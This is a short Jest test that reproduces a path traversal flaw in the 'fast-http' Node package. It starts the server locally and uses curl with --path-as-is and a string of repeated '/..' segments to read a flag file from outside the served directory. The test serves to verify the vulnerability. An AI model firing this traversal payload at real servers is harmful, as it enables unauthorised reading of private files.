
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in fast-http", (done) => {
    const Server = require("fast-http");
    const fs = require("fs");
    const { exec } = require("child_process");
    let hostsFile = fs.readFileSync(pathToFlag).toString();

    let srv = new Server(8080,'./',true)

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${genstr()}"`;

    exec(attack_string, (error, stdout) => {
        expect(stdout).toBe(hostsFile);
        //srv.stop(); // without stopping the server, Jest hangs
        done();
    });
});
